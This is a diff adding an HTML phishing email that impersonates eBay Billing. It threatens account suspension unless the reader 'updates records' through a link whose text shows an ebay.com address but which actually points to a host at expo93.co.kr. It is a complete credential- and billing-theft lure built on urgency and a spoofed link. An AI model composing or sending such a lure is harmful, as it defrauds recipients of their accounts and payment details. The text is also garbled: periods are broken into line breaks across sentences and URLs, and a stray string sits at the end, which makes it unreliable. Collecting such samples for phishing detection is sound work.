@@ -1,0 +1,42 @@
+<html>
+<br>Dear eBay Community Member,
+<br>It has come to our attention that your eBay billing informations are
+<br>out of order
+ If you could please take 5-10 minutes out of your
+<br>online experience and update your personal records you will not run
+<br>into any future problems with the online service
+ However, failure
+<br>to update your records will result in account suspension
+ Please
+<br>update your records by November 10th
+
+<br>
+<br>
+<br>Once you have updated your account records your eBay session will not
+be
+<br>interrupted and will continue as normal
+ Failure to update will result in
+<br>cancellation of service, Terms of Service (TOS) violations or future
+<br>problems
+
+<br>
+<br>To update your eBay records click here:
+<br><a HREF="http://expo93
+co
+kr/ws/ebayISAPI
+dll/UPdate/index
+html"
+target="_self">http://cgi1
+ebay
+com/aw-cgi/ebayISAPI
+dll
+UPdate</a>
+<br>
+<br>Thank you for using eBay
+
+<br>
+<br>Regards,
+<br>eBay Billing
+</html>
+
+ggfvvn
